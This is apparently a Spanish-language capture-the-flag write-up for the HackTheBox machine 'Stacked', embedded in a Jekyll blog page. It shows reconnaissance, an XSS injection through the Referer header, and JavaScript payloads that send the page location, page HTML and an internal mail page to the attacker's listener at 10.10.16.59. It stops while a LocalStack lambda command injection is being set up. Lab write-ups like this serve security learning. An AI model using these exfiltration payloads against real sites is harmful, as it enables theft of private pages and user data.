@@ -1,0 +1,846 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.23.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Stacked - HackTheBox - Fr4nzisko</title>
+<meta name="description" content="Esta es una máquina de dificultad loca, para la intrusión aproveché XSS para derivar a SSRF y de este modo ganar acceso abusando de la creación de funciones lambda de AWS. Para la escalada de privilegios encontré una tarea que se ejecutaba a intervalos regulares de tiempo, esta concatenaba el parámetro –handler a la hora de crear la función lambda por lo que conseguí inyectar comandos y convertirme en root en el contenedor.">
+
+
+  <meta name="author" content="Fr4nzisko">
+  
+  <meta property="article:author" content="Fr4nzisko">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Fr4nzisko">
+<meta property="og:title" content="Stacked - HackTheBox">
+<meta property="og:url" content="http://localhost:4000/hackthebox/Stacked/">
+
+
+  <meta property="og:description" content="Esta es una máquina de dificultad loca, para la intrusión aproveché XSS para derivar a SSRF y de este modo ganar acceso abusando de la creación de funciones lambda de AWS. Para la escalada de privilegios encontré una tarea que se ejecutaba a intervalos regulares de tiempo, esta concatenaba el parámetro –handler a la hora de crear la función lambda por lo que conseguí inyectar comandos y convertirme en root en el contenedor.">
+
+
+
+  <meta property="og:image" content="https://user-images.githubusercontent.com/69093629/162566860-ab5283b5-4e36-48ef-a899-15a23294e3fc.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2022-04-09T00:00:00-04:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/hackthebox/Stacked/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Fr4nzisko",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+  <meta name="google-site-verification" content="mV7b_uBVZWzlYpLtwQoiB3Eb7iioF8rEc2Y-GldRYB8" />
+
+
+  <meta name="msvalidate.01" content="0FC3FD70512616B052E755A56F8952D">
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Fr4nzisko Feed">
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Stacked - HackTheBox | Fr4nzisko</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Stacked - HackTheBox" />
+<meta name="author" content="Fr4nzisko" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Esta es una máquina de dificultad loca, para la intrusión aproveché XSS para derivar a SSRF y de este modo ganar acceso abusando de la creación de funciones lambda de AWS. Para la escalada de privilegios encontré una tarea que se ejecutaba a intervalos regulares de tiempo, esta concatenaba el parámetro –handler a la hora de crear la función lambda por lo que conseguí inyectar comandos y convertirme en root en el contenedor." />
+<meta property="og:description" content="Esta es una máquina de dificultad loca, para la intrusión aproveché XSS para derivar a SSRF y de este modo ganar acceso abusando de la creación de funciones lambda de AWS. Para la escalada de privilegios encontré una tarea que se ejecutaba a intervalos regulares de tiempo, esta concatenaba el parámetro –handler a la hora de crear la función lambda por lo que conseguí inyectar comandos y convertirme en root en el contenedor." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/Stacked/" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/Stacked/" />
+<meta property="og:site_name" content="Fr4nzisko" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-04-09T00:00:00-04:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Stacked - HackTheBox" />
+<meta name="twitter:site" content="@" />
+<meta name="twitter:creator" content="@Fr4nzisko" />
+<meta name="google-site-verification" content="mV7b_uBVZWzlYpLtwQoiB3Eb7iioF8rEc2Y-GldRYB8" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Fr4nzisko"},"dateModified":"2022-04-09T00:00:00-04:00","datePublished":"2022-04-09T00:00:00-04:00","description":"Esta es una máquina de dificultad loca, para la intrusión aproveché XSS para derivar a SSRF y de este modo ganar acceso abusando de la creación de funciones lambda de AWS. Para la escalada de privilegios encontré una tarea que se ejecutaba a intervalos regulares de tiempo, esta concatenaba el parámetro –handler a la hora de crear la función lambda por lo que conseguí inyectar comandos y convertirme en root en el contenedor.","headline":"Stacked - HackTheBox","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/Stacked/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/"},"name":"Fr4nzisko"},"url":"http://localhost:4000/hackthebox/Stacked/"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+    <h2 class="screen-reader-text">Skip links</h2>
+    <ul>
+      <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+      <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+      <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+    </ul>
+  </nav>
+  
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          Fr4nzisko
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/">Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/">Artículos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/">Categorías</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/">Etiquetas</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/">Buscador</a>
+            </li><li class="masthead__menu-item">
+              <a href="/scripts/">Scripts</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/categories/#hackthebox" itemprop="item"><span itemprop="name">Hackthebox</span></a>
+          <meta itemprop="position" content="2" />
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        <li class="current">Stacked - HackTheBox</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+        <img src="https://avatars.githubusercontent.com/u/59784204?v=4" alt="Fr4nzisko" itemprop="image" style="border: #00485c;">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Fr4nzisko</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>Cybersecurity Engineer (in process)/ Cybersecurity Technician / Telecommunications Technician /  <strong>Red Team</strong> 🔴</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+            <li><a href="https://github.com/Fr4nzisko" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://app.hackthebox.com/profile/174531" rel="nofollow noopener noreferrer"><i class="fas fa-cube" aria-hidden="true"></i><span class="label">HackTheBox</span></a></li>
+          
+        
+          
+            <li><a href="https://www.linkedin.com/in/jose-francisco-flores-/" rel="nofollow noopener noreferrer"><i class="fab fa-linkedin-in" aria-hidden="true"></i><span class="label">Linkedin</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Stacked - HackTheBox">
+    <meta itemprop="description" content="Esta es una máquina de dificultad loca, para la intrusión aproveché XSS para derivar a SSRF y de este modo ganar acceso abusando de la creación de funciones lambda de AWS. Para la escalada de privilegios encontré una tarea que se ejecutaba a intervalos regulares de tiempo, esta concatenaba el parámetro –handler a la hora de crear la función lambda por lo que conseguí inyectar comandos y convertirme en root en el contenedor.">
+    <meta itemprop="datePublished" content="2022-04-09T00:00:00-04:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Stacked - HackTheBox
+</h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true">&nbsp;</i>
+        
+        <time datetime="2022-04-09T00:00:00-04:00">April 9, 2022</time>
+      </span>
+    
+
+      
+  </p>
+
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p><img src="https://user-images.githubusercontent.com/69093629/162567844-d6f57cec-8a31-4f6d-9c72-b540b9539d02.jpg" alt="Stackedinsane" /></p>
+
+<p>Comencé con un escaneo de <code class="language-plaintext highlighter-rouge">nmap</code> para detectar puertos abiertos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[Fr4nzisko@RedTeam]─[/home/Fr4nzisko/HTB/Altered/nmap]
+└──╼ <span class="nb">cat </span>nmap.txt
+<span class="c"># Nmap 7.92 scan initiated Tue Apr  5 00:07:08 2022 as: nmap -sS --min-rate 5000 -v -n -p- --open -Pn -o nmap.txt 10.10.11.112</span>
+Nmap scan report <span class="k">for </span>10.10.11.112
+Host is up <span class="o">(</span>0.30s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 52678 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>, 12855 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Read data files from: /usr/bin/../share/nmap
+<span class="c"># Nmap done at Tue Apr  5 00:09:43 2022 -- 1 IP address (1 host up) scanned in 154.73 seconds</span>
+</code></pre></div></div>
+
+<p>Efectúe otro escaneo para identificar la versión de cada servicio abierto.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[Fr4nzisko@RedTeam]─[/home/Fr4nzisko/HTB/Altered/nmap]
+└──╼ <span class="nb">cat </span>services.txt
+<span class="c"># Nmap 7.92 scan initiated Tue Apr  5 00:09:49 2022 as: nmap -sCV -p80,22 -o services.txt 10.10.11.112</span>
+Nmap scan report <span class="k">for </span>stacked.htb <span class="o">(</span>10.10.11.112<span class="o">)</span>
+Host is up <span class="o">(</span>0.056s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   3072 12:8f:2b:60:bc:21:bd:db:cb:13:02:03:ef:59:36:a5 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 af:f3:1a:6a:e7:13:a9:c0:25:32:d0:2c:be:59:33:e4 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 39:50:d5:79:cd:0e:f0:24:d3:2c:f4:23:ce:d2:a6:f2 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.41
+|_http-title: STACKED.HTB
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Tue Apr  5 00:09:59 2022 -- 1 IP address (1 host up) scanned in 10.07 seconds</span>
+Tenia dos puertos abiertos: 22 y 80. De momento SSH no me servía, por lo que mire el servidor web.
+</code></pre></div></div>
+
+<h3 id="puerto-80">Puerto 80</h3>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162542058-fe18f6f0-716c-4253-abd3-60aeeaab11fe.png" alt="0" /></p>
+
+<p>Hacia un <em>Redirect</em> a <code class="language-plaintext highlighter-rouge">stacked.htb</code>, se estaba aplicando <em>Virtual Hosting</em>: alojar distintos dominios en una misma dirección IP.</p>
+
+<p>Para poder acceder a este dominio, incluí <code class="language-plaintext highlighter-rouge">stacked.htb</code> en el <code class="language-plaintext highlighter-rouge">/etc/hosts</code> haciendo que <code class="language-plaintext highlighter-rouge">10.10.11.159</code> apunte a este.</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162542270-ae82e720-1466-44f2-bdef-dc3fc38d2194.png" alt="0" /></p>
+
+<p>Ahora si pude ver lo que tenía.</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162539490-ac1ccea4-4b88-4d20-8817-a55569659bd0.png" alt="0" /></p>
+
+<p>Al parecer era un contador, nada interesante, probé inyecciones en el campo ‘email’ pero no era vulnerable.</p>
+
+<h2 id="fuzzing">Fuzzing</h2>
+
+<p>Hice <em>fuzzing</em> con <code class="language-plaintext highlighter-rouge">wfuzz</code> para encontrar directorios:</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162539914-9922bf05-b9ea-4800-b527-14162cf88e90.png" alt="0" /></p>
+
+<p>Me encontró algunos directorios, pero no eran de importancia, efectúe <em>fuzzing</em> de subdominios mediante la cabecera <code class="language-plaintext highlighter-rouge">Host</code> y me encontró <code class="language-plaintext highlighter-rouge">portfolio</code>.</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162550002-16eef189-6205-43c6-8c1e-52282cdb93ac.png" alt="0" /></p>
+
+<p>Lo incluí en el <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162542467-87bccc15-e322-496f-807b-3019a58d00f9.png" alt="0" /></p>
+
+<h4 id="portfoliostackedhtb">portfolio.stacked.htb</h4>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162542732-9c3901c1-9047-40ce-b6f4-1df84725f3db.png" alt="0" /></p>
+
+<p>Esta página tenía tres secciones: Porfolio, About y Contact, todas estas estaban en la misma página.</p>
+
+<p>En About encontré un botón de descarga de un archivo llamado <code class="language-plaintext highlighter-rouge">docker-compose.yml</code>.</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162542894-b9b79211-04e1-4522-a163-bacc6455934b.png" alt="0" /></p>
+
+<p>Este es un archivo YAML donde se suelen definir volúmenes, redes y servicios, este era su contenido:</p>
+
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">version</span><span class="pi">:</span> <span class="s2">"</span><span class="s">3.3"</span>
+
+<span class="na">services</span><span class="pi">:</span>
+  <span class="na">localstack</span><span class="pi">:</span>
+    <span class="na">container_name</span><span class="pi">:</span> <span class="s2">"</span><span class="s">${LOCALSTACK_DOCKER_NAME-localstack_main}"</span>
+    <span class="na">image</span><span class="pi">:</span> <span class="s">localstack/localstack-full:0.12.6</span>
+    <span class="na">network_mode</span><span class="pi">:</span> <span class="s">bridge</span>
+    <span class="na">ports</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="s2">"</span><span class="s">127.0.0.1:443:443"</span>
+      <span class="pi">-</span> <span class="s2">"</span><span class="s">127.0.0.1:4566:4566"</span>
+      <span class="pi">-</span> <span class="s2">"</span><span class="s">127.0.0.1:4571:4571"</span>
+      <span class="pi">-</span> <span class="s2">"</span><span class="s">127.0.0.1:${PORT_WEB_UI-8080}:${PORT_WEB_UI-8080}"</span>
+    <span class="na">environment</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="s">SERVICES=serverless</span>
+      <span class="pi">-</span> <span class="s">DEBUG=1</span>
+      <span class="pi">-</span> <span class="s">DATA_DIR=/var/localstack/data</span>
+      <span class="pi">-</span> <span class="s">PORT_WEB_UI=${PORT_WEB_UI- }</span>
+      <span class="pi">-</span> <span class="s">LAMBDA_EXECUTOR=${LAMBDA_EXECUTOR- }</span>
+      <span class="pi">-</span> <span class="s">LOCALSTACK_API_KEY=${LOCALSTACK_API_KEY- }</span>
+      <span class="pi">-</span> <span class="s">KINESIS_ERROR_PROBABILITY=${KINESIS_ERROR_PROBABILITY- }</span>
+      <span class="pi">-</span> <span class="s">DOCKER_HOST=unix:///var/run/docker.sock</span>
+      <span class="pi">-</span> <span class="s">HOST_TMP_FOLDER="/tmp/localstack"</span>
+    <span class="na">volumes</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="s2">"</span><span class="s">/tmp/localstack:/tmp/localstack"</span>
+      <span class="pi">-</span> <span class="s2">"</span><span class="s">/var/run/docker.sock:/var/run/docker.sock"</span>
+</code></pre></div></div>
+
+<p>Al parecer estaba montado en local AWS, esto me llamo la atencion por lo que lo deje en segundo plano.</p>
+
+<h3 id="xss">XSS</h3>
+
+<p>En la sección Contact encontré un formulario.</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162543455-4c6edddd-e327-4759-a6ce-92c0c9b12815.png" alt="0" /></p>
+
+<p>Este podría ser vulnerable a XSS, intente inyectar <code class="language-plaintext highlighter-rouge">&lt;script&gt;alert("XSS")&lt;/script&gt;</code>pero este lo detectaba.</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162543579-8ff0f5cc-1ec7-4109-8f77-f7e2f524d799.png" alt="0" /></p>
+
+<p>En este punto decidí interceptar la petición con Burp para hacer <code class="language-plaintext highlighter-rouge">debugging</code> en las cabeceras de la petición.</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162543854-eafd3002-bf61-4fe9-902b-cffbf56da691.png" alt="0" /></p>
+
+<p>Abrí un servidor con Python por el puerto 80 y probé a inyectar <code class="language-plaintext highlighter-rouge">&lt;script src="http://10.10.16.59/"&gt;&lt;/script&gt;</code> en la cabecera <em>Referer</em>.</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162544074-7662d07d-a39b-4eb3-92d7-27fc34889e63.png" alt="0" /></p>
+
+<p>Y tras un pequeño intervalo de tiempo recibí una petición GET a mi servidor desde la máquina víctima.</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162544209-25b5969e-960e-47f5-8099-b79d0452d602.png" alt="0" /></p>
+
+<p>La cabecera <em>Referer</em> era vulnerable a XSS.</p>
+
+<h3 id="estrategia">Estrategia</h3>
+
+<p>Mi idea era identificar si el servidor tenía interacción con algún usuario, por lo que me cree un pequeño script en JS con el siguiente contenido:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">oReq</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+<span class="nx">oReq</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://10.10.16.59:9999/</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+<span class="nx">oReq</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+</code></pre></div></div>
+
+<p>Este lo que iba a hacer es enviar una petición GET a mi sesión de <code class="language-plaintext highlighter-rouge">nc</code> por el puerto 9999 con la ruta en la que se encontraba el usuario en ese momento.</p>
+
+<p>Abrí un servidor de Python por el puerto 8000 alojando <code class="language-plaintext highlighter-rouge">request-3.js</code> y apunté a mi archivo JS desde el XSS.</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162544871-e17b5ff2-1cb8-45cc-9a31-b43604991314.png" alt="0" /></p>
+
+<p>Espere un tiempo y recibí una conexión a mi sesión de <code class="language-plaintext highlighter-rouge">nc</code> en la que contenía una ruta.</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162544592-0e724ada-b7ed-499c-a487-1fbe20a7f167.png" alt="0" /></p>
+
+<p>Al parecer el usuario estaba en <code class="language-plaintext highlighter-rouge">mail.stacked.htb</code>. Este subdominio no lo encontró <code class="language-plaintext highlighter-rouge">wfuzz</code> porque operaba localmente en la máquina y no tenía acceso a el de manera externa.</p>
+
+<p>El siguiente paso fue descargar el HTML de <code class="language-plaintext highlighter-rouge">http://mail.stacked.htb/read-mail.php?id=7</code> y almacenarlo en <code class="language-plaintext highlighter-rouge">index.html</code>.</p>
+
+<p>Lo que hice fue crear otro script en JS con el siguiente código:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">oReq</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+<span class="nx">oReq</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://10.10.16.59:5555/</span><span class="dl">"</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+<span class="nx">oReq</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">documentElement</span><span class="p">.</span><span class="nx">outerHTML</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Este lo que hace es enviar una petición POST a mi sesión de netcat con el código HTML de la página en la que se encontraba el usuario por el puerto <code class="language-plaintext highlighter-rouge">5555</code> y almacenar este en un archivo llamado <code class="language-plaintext highlighter-rouge">index.html</code>.</p>
+
+<p>Apunte a mi archivo JS llamado <code class="language-plaintext highlighter-rouge">request.js</code> desde el XSS y recibí una conexión a mi sesión de <code class="language-plaintext highlighter-rouge">nc</code>.</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162545501-0ace3a79-4a76-4a62-b705-029fcaffb8fd.png" alt="0" /></p>
+
+<h3 id="esquema-de-ataque">Esquema de ataque:</h3>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162549694-f2646995-76e5-4b23-96ff-710ee65c508d.png" alt="Diagrama en blanco" /></p>
+
+<p>Esta era la página con el código HTML del usuario.</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162546326-2b628a81-cecf-40d4-a34e-d1587a2ec2cb.png" alt="webservidor2" /></p>
+
+<p>Había un usuario llamado <code class="language-plaintext highlighter-rouge">Jeremy Taint</code> con un hiperenlace que te redirigía a <code class="language-plaintext highlighter-rouge">/read-mail.php?id=1</code>:</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162546383-87e5e3a6-7cdc-43fb-a192-65bfca15d8f6.png" alt="0" /></p>
+
+<p>Esto me llamo la atención, por lo que decidí descargar el HTML correspondiente con el siguiente código JS:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">oReq</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+<span class="nx">oReq</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://mail.stacked.htb/read-mail.php?id=1</span><span class="dl">"</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+<span class="nx">oReq</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+
+<span class="kd">var</span> <span class="nx">response</span> <span class="o">=</span> <span class="nx">oReq</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
+
+<span class="kd">var</span> <span class="nx">resp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+<span class="nx">resp</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://10.10.16.59:5555/</span><span class="dl">"</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+<span class="nx">resp</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">response</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Este envia una petición GET a <code class="language-plaintext highlighter-rouge">http://mail.stacked.htb/read-mail.php?id=1</code> desde la instancia del usuario, almacenaba la respuesta en <code class="language-plaintext highlighter-rouge">response</code> y hace otra petición POST a mi sesión de <code class="language-plaintext highlighter-rouge">nc</code> con el contenido de la variable <code class="language-plaintext highlighter-rouge">response</code>.</p>
+
+<p>Apunte a mi archivo JS desde el XSS y recibí una conexión por <code class="language-plaintext highlighter-rouge">nc</code>, abrí un servidor por Python y mire que tenía esta segunda página.</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162546991-eb57a5f8-984b-4d79-a836-f12d605fe546.png" alt="subdominio" /></p>
+
+<p>Había un mensaje: <em>Hey Adam, I have set up S3 instance on s3-testing.stacked.htb so that you can configure the IAM users, roles and permissions. I have initialized a serverless instance for you to work from but keep in mind for the time being you can only run node instances. If you need anything let me know. Thanks</em>.</p>
+
+<p>Este decía que configure la instancia de S3 en <code class="language-plaintext highlighter-rouge">s3-testing.stacked.htb</code>, este era un nuevo subdominio que no tenía, por lo que lo añadí al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162547200-0e4ff1cc-fa24-4b70-9d47-42613ce5ab25.png" alt="0" /></p>
+
+<h3 id="s3-testingstackedhtb">s3-testing.stacked.htb</h3>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162547229-c2a8df2c-cf15-43b4-b484-8097a51b4b72.png" alt="s3" /></p>
+
+<p>Al parecer era una API de AWS, viendo esto me acordé del archivo <code class="language-plaintext highlighter-rouge">docker-compose.yml</code> el cual contenía información sobre un servicio AWS en local.</p>
+
+<p>Buscando vulnerabilidades de LocalStack encontre lo siguiente:</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162548008-b6c6c6da-fc2f-49d8-8e00-fd07ded05450.png" alt="Captura de pantalla 27" /></p>
+
+<p>Podía abusar del parámetro <code class="language-plaintext highlighter-rouge">functionName</code> en la creación de funciones lambda para inyectar mi código malicioso y así ganar <em>RCE</em>. Yo tenía conectividad con <code class="language-plaintext highlighter-rouge">s3-testing.stacked.htb</code> el cual me permitiría crear funciones lambda.</p>
+
+<p>Tras una pequeña búsqueda encontré la manera de crear una función lambda, esta se podía crear en más de un lenguaje, pero yo lo hice con Node.js.</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162548407-a7edec2c-9895-4e7a-88bd-ed06a3a50fba.png" alt="0" /></p>
+
+<p>Guarde el siguiente código en un archivo llamado <code class="language-plaintext highlighter-rouge">lambda.js</code>.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">exports</span><span class="p">.</span><span class="nx">handler</span> <span class="o">=</span>  <span class="k">async</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">,</span> <span class="nx">context</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="dl">"</span><span class="s2">Hacked</span><span class="dl">"</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Este debía estar comprimido en ZIP.</p>
+
+<p><img src="https://user-images.githubusercontent.com/69093629/162548681-e9ed776d-d38f-43c7-839e-241e252323ab.png" alt="ziplambda" /></p>
+
+<p>Para crear la función debía especificarle ciertos parámetros.</p>
+
